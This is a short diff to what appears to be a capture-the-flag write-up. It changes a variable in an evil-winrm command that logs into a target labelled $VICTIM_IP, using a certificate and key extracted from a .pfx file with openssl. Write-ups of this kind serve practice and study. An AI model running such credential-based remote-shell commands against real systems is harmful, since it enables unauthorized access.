@@ -13,5 +13,5 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
 
 Accessing the system
 ```bash
-evil-winrm -S -i $t -c cert.pem -k key.pem
+evil-winrm -S -i $VICTIM_IP -c cert.pem -k key.pem
 ```
